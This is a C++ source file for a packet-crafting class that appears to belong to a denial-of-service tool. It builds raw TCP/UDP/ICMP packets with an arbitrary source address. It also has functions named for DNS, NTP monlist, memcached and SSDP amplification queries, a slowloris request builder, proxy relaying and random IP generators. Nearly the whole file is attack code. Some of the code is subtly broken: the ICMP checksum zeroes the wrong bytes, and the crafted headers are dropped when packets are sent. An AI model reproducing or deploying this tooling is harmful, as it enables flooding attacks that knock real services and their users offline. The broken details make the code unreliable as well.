#include "ProtocolHandler.h"
#include <iostream>
#include <sstream>
#include <iomanip>
#include <random>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>

using namespace std;

ProtocolHandler::ProtocolHandler() : rng(random_device{}()) {}
ProtocolHandler::~ProtocolHandler() {}

uint16_t ProtocolHandler::calculate_checksum(const uint8_t* data, size_t length) {
    uint32_t sum = 0;
    const uint16_t* ptr = reinterpret_cast<const uint16_t*>(data);
    while (length > 1) { sum += *ptr++; length -= 2; }
    if (length == 1) sum += *(reinterpret_cast<const uint8_t*>(ptr));
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return static_cast<uint16_t>(~sum);
}

uint16_t ProtocolHandler::calculate_ip_checksum(const uint8_t* data, size_t length) {
    return calculate_checksum(data, length);
}

uint16_t ProtocolHandler::calculate_tcp_checksum(const uint8_t* ip_header, const uint8_t* tcp_header,
                                                 size_t tcp_len,
                                                 const uint8_t* payload, size_t payload_len) {
    struct { uint32_t src; uint32_t dst; uint8_t zero; uint8_t proto; uint16_t len; } pseudo;
    const struct iphdr* ip = reinterpret_cast<const struct iphdr*>(ip_header);
    pseudo.src = ip->saddr;
    pseudo.dst = ip->daddr;
    pseudo.zero = 0;
    pseudo.proto = IPPROTO_TCP;
    pseudo.len = htons(tcp_len + payload_len);
    size_t total = sizeof(pseudo) + tcp_len + (payload ? payload_len : 0);
    vector<uint8_t> buf(total);
    memcpy(buf.data(), &pseudo, sizeof(pseudo));
    memcpy(buf.data() + sizeof(pseudo), tcp_header, tcp_len);
    if (payload && payload_len > 0)
        memcpy(buf.data() + sizeof(pseudo) + tcp_len, payload, payload_len);
    return calculate_checksum(buf.data(), total);
}

uint16_t ProtocolHandler::calculate_udp_checksum(const uint8_t* ip_header, const uint8_t* udp_header,
                                                 size_t udp_len,
                                                 const uint8_t* payload, size_t payload_len) {
    struct { uint32_t src; uint32_t dst; uint8_t zero; uint8_t proto; uint16_t len; } pseudo;
    const struct iphdr* ip = reinterpret_cast<const struct iphdr*>(ip_header);
    pseudo.src = ip->saddr;
    pseudo.dst = ip->daddr;
    pseudo.zero = 0;
    pseudo.proto = IPPROTO_UDP;
    pseudo.len = htons(udp_len + payload_len);
    size_t total = sizeof(pseudo) + udp_len + (payload ? payload_len : 0);
    vector<uint8_t> buf(total);
    memcpy(buf.data(), &pseudo, sizeof(pseudo));
    memcpy(buf.data() + sizeof(pseudo), udp_header, udp_len);
    if (payload && payload_len > 0)
        memcpy(buf.data() + sizeof(pseudo) + udp_len, payload, payload_len);
    return calculate_checksum(buf.data(), total);
}

uint16_t ProtocolHandler::calculate_icmp_checksum(const uint8_t* icmp_header, size_t icmp_len,
                                                   const uint8_t* payload, size_t payload_len) {
    size_t total = icmp_len + (payload ? payload_len : 0);
    vector<uint8_t> buf(total);
    memcpy(buf.data(), icmp_header, icmp_len);
    if (payload && payload_len > 0)
        memcpy(buf.data() + icmp_len, payload, payload_len);
    memset(buf.data() + 6, 0, 2);
    return calculate_checksum(buf.data(), total);
}

void ProtocolHandler::build_ip_header(uint8_t* buffer, const string& src_ip, const string& dst_ip,
                                      uint8_t protocol, uint16_t total_len,
                                      uint16_t id, uint8_t ttl) {
    struct iphdr* ip = reinterpret_cast<struct iphdr*>(buffer);
    memset(ip, 0, sizeof(struct iphdr));
    ip->ihl = 5;
    ip->version = 4;
    ip->tot_len = htons(total_len);
    ip->id = htons(id);
    ip->ttl = ttl;
    ip->protocol = protocol;
    ip->saddr = inet_addr(src_ip.c_str());
    ip->daddr = inet_addr(dst_ip.c_str());
    ip->check = 0;
    ip->check = calculate_checksum(buffer, sizeof(struct iphdr));
}

void ProtocolHandler::build_tcp_header(uint8_t* buffer, uint16_t src_port, uint16_t dst_port,
                                       uint32_t seq, uint32_t ack, uint8_t flags,
                                       uint16_t window,
                                       const uint8_t* options, size_t options_len) {
    struct tcphdr* tcp = reinterpret_cast<struct tcphdr*>(buffer);
    memset(tcp, 0, sizeof(struct tcphdr));
    tcp->source = htons(src_port);
    tcp->dest = htons(dst_port);
    tcp->seq = htonl(seq);
    tcp->ack_seq = htonl(ack);
    tcp->doff = (sizeof(struct tcphdr) + options_len) / 4;
    tcp->syn = (flags & 0x02) ? 1 : 0;
    tcp->ack = (flags & 0x10) ? 1 : 0;
    tcp->fin = (flags & 0x01) ? 1 : 0;
    tcp->rst = (flags & 0x04) ? 1 : 0;
    tcp->psh = (flags & 0x08) ? 1 : 0;
    tcp->window = htons(window);
    if (options && options_len > 0)
        memcpy(buffer + sizeof(struct tcphdr), options, options_len);
}

void ProtocolHandler::build_udp_header(uint8_t* buffer, uint16_t src_port, uint16_t dst_port,
                                       uint16_t len) {
    struct udphdr* udp = reinterpret_cast<struct udphdr*>(buffer);
    memset(udp, 0, sizeof(struct udphdr));
    udp->source = htons(src_port);
    udp->dest = htons(dst_port);
    udp->len = htons(len);
}

void ProtocolHandler::build_icmp_header(uint8_t* buffer, uint8_t type, uint8_t code,
                                        uint16_t id, uint16_t seq) {
    struct icmphdr* icmp = reinterpret_cast<struct icmphdr*>(buffer);
    memset(icmp, 0, sizeof(struct icmphdr));
    icmp->type = type;
    icmp->code = code;
    icmp->un.echo.id = htons(id);
    icmp->un.echo.sequence = htons(seq);
    icmp->checksum = 0;
}

ProtocolHandler::Packet ProtocolHandler::create_udp_packet(const string& src_ip, uint16_t src_port,
                                                          const string& dst_ip, uint16_t dst_port,
                                                          const vector<uint8_t>& payload) {
    Packet pkt;
    pkt.protocol = UDP;
    pkt.source_ip = src_ip;
    pkt.dest_ip = dst_ip;
    pkt.source_port = src_port;
    pkt.dest_port = dst_port;
    size_t ip_len = sizeof(struct iphdr);
    size_t udp_len = sizeof(struct udphdr);
    size_t total = ip_len + udp_len + payload.size();
    pkt.data.resize(total);
    uint8_t* ptr = pkt.data.data();
    build_udp_header(ptr + ip_len, src_port, dst_port, udp_len + payload.size());
    if (!payload.empty()) memcpy(ptr + ip_len + udp_len, payload.data(), payload.size());
    build_ip_header(ptr, src_ip, dst_ip, IPPROTO_UDP, total, rand() % 65535);
    struct udphdr* uh = reinterpret_cast<struct udphdr*>(ptr + ip_len);
    uh->check = 0;
    uh->check = calculate_udp_checksum(ptr, ptr + ip_len, udp_len + payload.size(),
                                       payload.empty() ? nullptr : payload.data(), payload.size());
    return pkt;
}

ProtocolHandler::Packet ProtocolHandler::create_tcp_syn_packet(const string& src_ip, uint16_t src_port,
                                                              const string& dst_ip, uint16_t dst_port,
                                                              uint32_t seq_num, uint32_t ack_num) {
    Packet pkt;
    pkt.protocol = TCP;
    pkt.source_ip = src_ip;
    pkt.dest_ip = dst_ip;
    pkt.source_port = src_port;
    pkt.dest_port = dst_port;
    size_t ip_len = sizeof(struct iphdr);
    size_t tcp_len = sizeof(struct tcphdr);
    size_t total = ip_len + tcp_len;
    pkt.data.resize(total);
    build_tcp_header(pkt.data.data() + ip_len, src_port, dst_port, seq_num, ack_num, 0x02);
    build_ip_header(pkt.data.data(), src_ip, dst_ip, IPPROTO_TCP, total, rand() % 65535);
    return pkt;
}

ProtocolHandler::Packet ProtocolHandler::create_tcp_ack_packet(const string& src_ip, uint16_t src_port,
                                                              const string& dst_ip, uint16_t dst_port,
                                                              uint32_t seq_num, uint32_t ack_num) {
    Packet pkt;
    pkt.protocol = TCP;
    pkt.source_ip = src_ip;
    pkt.dest_ip = dst_ip;
    pkt.source_port = src_port;
    pkt.dest_port = dst_port;
    size_t ip_len = sizeof(struct iphdr);
    size_t tcp_len = sizeof(struct tcphdr);
    size_t total = ip_len + tcp_len;
    pkt.data.resize(total);
    build_tcp_header(pkt.data.data() + ip_len, src_port, dst_port, seq_num, ack_num, 0x10);
    build_ip_header(pkt.data.data(), src_ip, dst_ip, IPPROTO_TCP, total, rand() % 65535);
    return pkt;
}

ProtocolHandler::Packet ProtocolHandler::create_tcp_fin_packet(const string& src_ip, uint16_t src_port,
                                                              const string& dst_ip, uint16_t dst_port,
                                                              uint32_t seq_num, uint32_t ack_num) {
    Packet pkt;
    pkt.protocol = TCP;
    pkt.source_ip = src_ip;
    pkt.dest_ip = dst_ip;
    pkt.source_port = src_port;
    pkt.dest_port = dst_port;
    size_t ip_len = sizeof(struct iphdr);
    size_t tcp_len = sizeof(struct tcphdr);
    size_t total = ip_len + tcp_len;
    pkt.data.resize(total);
    build_tcp_header(pkt.data.data() + ip_len, src_port, dst_port, seq_num, ack_num, 0x01);
    build_ip_header(pkt.data.data(), src_ip, dst_ip, IPPROTO_TCP, total, rand() % 65535);
    return pkt;
}

ProtocolHandler::Packet ProtocolHandler::create_tcp_rst_packet(const string& src_ip, uint16_t src_port,
                                                              const string& dst_ip, uint16_t dst_port,
                                                              uint32_t seq_num, uint32_t ack_num) {
    Packet pkt;
    pkt.protocol = TCP;
    pkt.source_ip = src_ip;
    pkt.dest_ip = dst_ip;
    pkt.source_port = src_port;
    pkt.dest_port = dst_port;
    size_t ip_len = sizeof(struct iphdr);
    size_t tcp_len = sizeof(struct tcphdr);
    size_t total = ip_len + tcp_len;
    pkt.data.resize(total);
    build_tcp_header(pkt.data.data() + ip_len, src_port, dst_port, seq_num, ack_num, 0x04);
    build_ip_header(pkt.data.data(), src_ip, dst_ip, IPPROTO_TCP, total, rand() % 65535);
    return pkt;
}

ProtocolHandler::Packet ProtocolHandler::create_icmp_packet(const string& src_ip, const string& dst_ip,
                                                           uint8_t type, uint8_t code,
                                                           const vector<uint8_t>& payload) {
    Packet pkt;
    pkt.protocol = ICMP;
    pkt.source_ip = src_ip;
    pkt.dest_ip = dst_ip;
    size_t ip_len = sizeof(struct iphdr);
    size_t icmp_len = sizeof(struct icmphdr);
    size_t total = ip_len + icmp_len + payload.size();
    pkt.data.resize(total);
    build_icmp_header(pkt.data.data() + ip_len, type, code, rand() % 65535, rand() % 65535);
    if (!payload.empty())
        memcpy(pkt.data.data() + ip_len + icmp_len, payload.data(), payload.size());
    struct icmphdr* icmp = reinterpret_cast<struct icmphdr*>(pkt.data.data() + ip_len);
    icmp->checksum = calculate_icmp_checksum(pkt.data.data() + ip_len, icmp_len,
                                                payload.empty() ? nullptr : payload.data(),
                                                payload.size());
    build_ip_header(pkt.data.data(), src_ip, dst_ip, IPPROTO_ICMP, total, rand() % 65535);
    return pkt;
}

ProtocolHandler::Packet ProtocolHandler::create_icmp_echo_request(const string& src_ip, const string& dst_ip,
                                                                  uint16_t id, uint16_t seq,
                                                                  const vector<uint8_t>& payload) {
    (void)id; (void)seq;
    return create_icmp_packet(src_ip, dst_ip, ICMP_ECHO, 0, payload);
}

ProtocolHandler::Packet ProtocolHandler::create_icmp_echo_reply(const string& src_ip, const string& dst_ip,
                                                                uint16_t id, uint16_t seq,
                                                                const vector<uint8_t>& payload) {
    (void)id; (void)seq;
    return create_icmp_packet(src_ip, dst_ip, ICMP_ECHOREPLY, 0, payload);
}

ProtocolHandler::Packet ProtocolHandler::create_http_request(const string& method, const string& url,
                                                            const string& host, const string& user_agent,
                                                            const vector<pair<string, string>>& headers,
                                                            const vector<uint8_t>& body) {
    Packet pkt;
    pkt.protocol = HTTP;
    pkt.dest_ip = host;
    string http_request = method + " " + url + " HTTP/1.1\r\n";
    http_request += "Host: " + host + "\r\n";
    http_request += "User-Agent: " + user_agent + "\r\n";
    http_request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
    http_request += "Accept-Language: en-US,en;q=0.5\r\n";
    http_request += "Accept-Encoding: gzip, deflate\r\n";
    for (const auto& h : headers)
        http_request += h.first + ": " + h.second + "\r\n";
    if (!body.empty())
        http_request += "Content-Length: " + to_string(body.size()) + "\r\n";
    http_request += "Connection: keep-alive\r\n\r\n";
    pkt.data.assign(http_request.begin(), http_request.end());
    if (!body.empty())
        pkt.data.insert(pkt.data.end(), body.begin(), body.end());
    return pkt;
}

ProtocolHandler::Packet ProtocolHandler::create_http_get(const string& url, const string& host,
                                                         const string& user_agent,
                                                         const vector<pair<string, string>>& headers) {
    return create_http_request("GET", url, host, user_agent, headers);
}

ProtocolHandler::Packet ProtocolHandler::create_http_post(const string& url, const string& host,
                                                          const string& user_agent,
                                                          const vector<pair<string, string>>& headers,
                                                          const vector<uint8_t>& body) {
    return create_http_request("POST", url, host, user_agent, headers, body);
}

ProtocolHandler::Packet ProtocolHandler::create_http_head(const string& url, const string& host,
                                                          const string& user_agent,
                                                          const vector<pair<string, string>>& headers) {
    return create_http_request("HEAD", url, host, user_agent, headers);
}

vector<uint8_t> ProtocolHandler::encode_dns_name(const string& domain) {
    vector<uint8_t> encoded;
    istringstream iss(domain);
    string label;
    while (getline(iss, label, '.')) {
        encoded.push_back(label.size());
        for (char c : label) encoded.push_back(c);
    }
    encoded.push_back(0);
    return encoded;
}

ProtocolHandler::Packet ProtocolHandler::create_dns_query(const string& domain, uint16_t query_type) {
    Packet pkt;
    pkt.protocol = DNS;
    uint16_t tx_id = rand() % 65535;
    vector<uint8_t> dns;
    dns.push_back((tx_id >> 8) & 0xff);
    dns.push_back(tx_id & 0xff);
    dns.push_back(0x01);
    dns.push_back(0x00);
    dns.push_back(0x00);
    dns.push_back(0x01);
    dns.push_back(0x00);
    dns.push_back(0x00);
    dns.push_back(0x00);
    dns.push_back(0x00);
    dns.push_back(0x00);
    dns.push_back(0x01);
    auto encoded_name = encode_dns_name(domain);
    dns.insert(dns.end(), encoded_name.begin(), encoded_name.end());
    dns.push_back((query_type >> 8) & 0xff);
    dns.push_back(query_type & 0xff);
    dns.push_back(0x00);
    dns.push_back(0x01);
    pkt.data = dns;
    return pkt;
}

ProtocolHandler::Packet ProtocolHandler::create_dns_amplification_query(const string& domain, uint16_t query_type) {
    Packet pkt = create_dns_query(domain, query_type);
    pkt.protocol = DNS;
    return pkt;
}

ProtocolHandler::Packet ProtocolHandler::create_ntp_monlist_query() {
    Packet pkt;
    pkt.protocol = NTP;
    vector<uint8_t> ntp(48, 0);
    ntp[0] = 0x1b;
    ntp[1] = 0x00;
    ntp[2] = 0x03;
    ntp[3] = 0x2a;
    pkt.data = ntp;
    return pkt;
}

ProtocolHandler::Packet ProtocolHandler::create_ntp_amplification_query() {
    return create_ntp_monlist_query();
}

ProtocolHandler::Packet ProtocolHandler::create_memcached_stats_query() {
    Packet pkt;
    pkt.protocol = MEMCACHED;
    string cmd = "stats\r\n";
    pkt.data.assign(cmd.begin(), cmd.end());
    return pkt;
}

ProtocolHandler::Packet ProtocolHandler::create_memcached_amplification_query(const vector<uint8_t>& payload) {
    Packet pkt;
    pkt.protocol = MEMCACHED;
    if (payload.empty()) return create_memcached_stats_query();
    pkt.data = payload;
    return pkt;
}

ProtocolHandler::Packet ProtocolHandler::create_ssdp_discovery_query() {
    Packet pkt;
    pkt.protocol = SSDP;
    string msearch = "M-SEARCH * HTTP/1.1\r\n"
                     "HOST: 239.255.255.250:1900\r\n"
                     "MAN: \"ssdp:discover\"\r\n"
                     "MX: 3\r\n"
                     "ST: ssdp:all\r\n\r\n";
    pkt.data.assign(msearch.begin(), msearch.end());
    return pkt;
}

ProtocolHandler::Packet ProtocolHandler::create_ssdp_amplification_query() {
    return create_ssdp_discovery_query();
}

ProtocolHandler::Packet ProtocolHandler::create_slowloris_request(const string& host, const string& path,
                                                                  const string& user_agent) {
    Packet pkt;
    pkt.protocol = SLOWLORIS;
    string req = "GET " + path + " HTTP/1.1\r\n"
                 "Host: " + host + "\r\n"
                 "User-Agent: " + user_agent + "\r\n"
                 "Accept: */*\r\n";
    pkt.data.assign(req.begin(), req.end());
    return pkt;
}

bool ProtocolHandler::send_packet(const Packet& packet, bool use_proxy,
                                  const string& proxy_ip, uint16_t proxy_port) {
    if (use_proxy && !proxy_ip.empty())
        return send_packet_through_proxy(packet, proxy_ip, proxy_port);
    return send_packet_raw(packet);
}

bool ProtocolHandler::send_packet_raw(const Packet& packet) {
    if (packet.data.empty()) return false;
    switch (packet.protocol) {
        case UDP: case DNS: case NTP: case MEMCACHED: case SSDP: {
            int sock = socket(AF_INET, SOCK_DGRAM, 0);
            if (sock < 0) return false;
            struct sockaddr_in dest;
            memset(&dest, 0, sizeof(dest));
            dest.sin_family = AF_INET;
            dest.sin_port = htons(packet.dest_port);
            inet_pton(AF_INET, packet.dest_ip.c_str(), &dest.sin_addr);
            ssize_t sent = sendto(sock, packet.data.data(), packet.data.size(), 0,
                                  (struct sockaddr*)&dest, sizeof(dest));
            close(sock);
            return sent > 0;
        }
        default: break;
    }
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return false;
    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(packet.dest_port);
    inet_pton(AF_INET, packet.dest_ip.c_str(), &dest.sin_addr);
    struct timeval tv;
    tv.tv_sec = 5;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    bool ok = connect(sock, (struct sockaddr*)&dest, sizeof(dest)) == 0;
    if (ok) {
        ssize_t sent = send(sock, packet.data.data(), packet.data.size(), 0);
        ok = sent > 0;
    }
    close(sock);
    return ok;
}

bool ProtocolHandler::send_packet_through_proxy(const Packet& packet,
                                                const string& proxy_ip, uint16_t proxy_port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return false;
    struct sockaddr_in proxy_addr;
    memset(&proxy_addr, 0, sizeof(proxy_addr));
    proxy_addr.sin_family = AF_INET;
    proxy_addr.sin_port = htons(proxy_port);
    inet_pton(AF_INET, proxy_ip.c_str(), &proxy_addr.sin_addr);
    struct timeval tv;
    tv.tv_sec = 5;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    if (connect(sock, (struct sockaddr*)&proxy_addr, sizeof(proxy_addr)) < 0) {
        close(sock);
        return false;
    }
    string connect_req = "CONNECT " + packet.dest_ip + ":" + to_string(packet.dest_port) + " HTTP/1.1\r\n\r\n";
    send(sock, connect_req.data(), connect_req.size(), 0);
    char proxy_buf[256];
    recv(sock, proxy_buf, sizeof(proxy_buf), 0);
    ssize_t sent = send(sock, packet.data.data(), packet.data.size(), 0);
    close(sock);
    return sent > 0;
}

string ProtocolHandler::generate_random_ip() {
    random_device rd;
    mt19937 g(rd());
    uniform_int_distribution<> dis(1, 254);
    return to_string(dis(g)) + "." + to_string(dis(g)) + "." +
           to_string(dis(g)) + "." + to_string(dis(g));
}

uint16_t ProtocolHandler::generate_random_port() {
    random_device rd;
    mt19937 g(rd());
    uniform_int_distribution<> dis(1024, 65535);
    return dis(g);
}

vector<uint8_t> ProtocolHandler::generate_random_payload(size_t size) {
    random_device rd;
    mt19937 g(rd());
    vector<uint8_t> payload(size);
    for (auto& b : payload) b = g() % 256;
    return payload;
}

string ProtocolHandler::generate_random_mac() {
    random_device rd;
    mt19937 g(rd());
    stringstream ss;
    ss << hex << setfill('0');
    for (int i = 0; i < 6; i++) {
        if (i > 0) ss << ":";
        ss << setw(2) << (g() % 256);
    }
    return ss.str();
}

uint32_t ProtocolHandler::generate_random_ip_int() {
    random_device rd;
    mt19937 g(rd());
    return g();
}

bool ProtocolHandler::validate_ip(const string& ip) {
    struct sockaddr_in sa;
    return inet_pton(AF_INET, ip.c_str(), &(sa.sin_addr)) == 1;
}

bool ProtocolHandler::validate_port(uint16_t port) {
    return port > 0 && port <= 65535;
}

bool ProtocolHandler::validate_mac(const string& mac) {
    if (mac.size() != 17) return false;
    for (size_t i = 0; i < 17; i++) {
        if (i % 3 == 2) { if (mac[i] != ':') return false; }
        else { if (!isxdigit(mac[i])) return false; }
    }
    return true;
}

uint32_t ProtocolHandler::ip_to_int(const string& ip) {
    struct sockaddr_in sa;
    inet_pton(AF_INET, ip.c_str(), &(sa.sin_addr));
    return ntohl(sa.sin_addr.s_addr);
}

string ProtocolHandler::int_to_ip(uint32_t ip) {
    struct in_addr addr;
    addr.s_addr = htonl(ip);
    char buf[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &addr, buf, INET_ADDRSTRLEN);
    return string(buf);
}

string ProtocolHandler::mac_to_string(const uint8_t* mac) {
    stringstream ss;
    ss << hex << setfill('0');
    for (int i = 0; i < 6; i++) {
        if (i > 0) ss << ":";
        ss << setw(2) << (int)mac[i];
    }
    return ss.str();
}

void ProtocolHandler::string_to_mac(const string& mac_str, uint8_t* mac) {
    unsigned int values[6];
    sscanf(mac_str.c_str(), "%x:%x:%x:%x:%x:%x",
           &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]);
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)values[i];
}
